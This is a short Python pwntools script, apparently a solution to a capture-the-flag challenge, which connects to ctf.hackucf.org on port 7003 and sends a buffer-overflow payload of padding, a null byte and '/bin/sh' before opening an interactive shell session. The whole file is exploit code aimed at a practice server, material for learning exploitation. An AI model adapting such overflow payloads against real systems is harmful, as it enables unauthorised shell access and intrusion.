from pwn import *

def main():
    r = remote("ctf.hackucf.org",7003)

    p = ""
    p += "A" * 55
    p += "\x00"
    p += "/bin/sh"

    r.sendline(p)
    r.interactive()


if __name__ == "__main__":
    main()
